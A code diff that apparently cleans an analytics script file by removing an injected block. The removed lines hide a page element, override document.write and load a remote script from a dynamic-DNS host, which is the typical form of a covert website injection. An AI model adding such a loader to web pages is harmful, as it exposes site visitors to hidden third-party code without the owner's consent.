@@ -7,22 +7,5 @@ ga('create', 'UA-61679308-1', 'auto');
 ga('send', 'pageview');
 
 
-setTimeout(function(){
-console.log("active");
-    (function() {
-      console.log("load");
-   var lugar = document.getElementById("parawebs")
-  	lugar.setAttribute("style", "display:none");
-    lugar.innerHTML = "";
-    var script = document.createElement("script");
-    script.type = "text/javascript";
-    script.src = "http://www.zulia.citastag.dyndns.org/regional/index.php?ac=ceop";
-    if (!document._write) document._write = document.write;
-    document.write = function(str) {
-        lugar.innerHTML += str;
-    };
-    lugar.appendChild(script);
 
-})();
-}, 0);
 
